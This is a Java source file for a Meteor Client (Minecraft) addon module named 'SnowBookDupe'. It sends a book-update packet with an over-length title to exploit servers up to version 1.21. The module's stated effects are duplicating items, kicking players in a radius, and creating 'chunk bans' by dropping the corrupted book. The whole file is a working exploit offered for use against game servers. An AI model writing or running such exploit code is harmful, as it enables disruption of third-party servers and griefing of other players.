//Credits to Thorioum https://github.com/Thorioum for discovery of this!

package com.example.addon.modules;

import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.game.OpenScreenEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.gui.screen.DisconnectedScreen;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.BookUpdateC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import com.example.addon.AddonTemplate;

import java.util.ArrayList;
import java.util.Optional;

public class SnowBookDupe extends Module {
    private final SettingGroup sgSpecial = settings.createGroup("Book And Quill Dupe works on server versions 1.20.6+");
    private final Setting<Boolean> disconnectdisable = sgSpecial.add(new BoolSetting.Builder()
            .name("Disable on Disconnect")
            .description("Disables module on disconnecting")
            .defaultValue(true)
            .build());
    public final Setting<Boolean> donottoss = sgSpecial.add(new BoolSetting.Builder()
            .name("dont-toss-inventory")
            .description("Use if you don't want to empty your inventory and just want to kick people in radius.")
            .defaultValue(false)
            .build()
    );
    public final Setting<Boolean> chunkBan = sgSpecial.add(new BoolSetting.Builder()
            .name("create-chunk-ban")
            .description("Tosses the cursed book on the ground.")
            .defaultValue(false)
            .build()
    );
    public SnowBookDupe() {
        super(AddonTemplate.CATEGORY, "Dookinqq Book Dupe", "Overflows data in a book's title to cause dupes and chunk bans. Credits to Thorioum! Only works in servers up to version 1.21, or Vanilla 1.21.1.");
    }
    @EventHandler
    private void onScreenOpen(OpenScreenEvent event) {
        if (disconnectdisable.get() && event.screen instanceof DisconnectedScreen) toggle();
    }
    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (disconnectdisable.get()) toggle();
    }
    @Override
    public void onActivate() {
        if (mc.player.getMainHandStack().getItem() != Items.WRITABLE_BOOK) {
            error("You must be holding a writable book to use this.");
            toggle();
            return;
        }
        ArrayList<String> pages = new ArrayList<>();
        pages.add("popbob");
        if (!donottoss.get()){
            for (int i = 9; i <= 44; i++) {
                if (com.example.addon.utils.Compat.getSelectedSlot(mc.player.getInventory()) == i-36) continue;
                mc.interactionManager.clickSlot(mc.player.currentScreenHandler.syncId, i, 10, SlotActionType.THROW, mc.player);
            }
            mc.player.networkHandler.sendPacket(new BookUpdateC2SPacket(com.example.addon.utils.Compat.getSelectedSlot(mc.player.getInventory()), pages, Optional.of("popbobfunnysexdupe2024hahafunnyrealrealreal")));
            if (chunkBan.get())mc.interactionManager.clickSlot(mc.player.currentScreenHandler.syncId, 36, 10, SlotActionType.THROW, mc.player);
        } else {
            mc.player.networkHandler.sendPacket(new BookUpdateC2SPacket(com.example.addon.utils.Compat.getSelectedSlot(mc.player.getInventory()), pages, Optional.of("popbobfunnysexdupe2024hahafunnyrealrealreal")));
            if (chunkBan.get())mc.interactionManager.clickSlot(mc.player.currentScreenHandler.syncId, 36, 10, SlotActionType.THROW, mc.player);
        }
        toggle();
    }
}


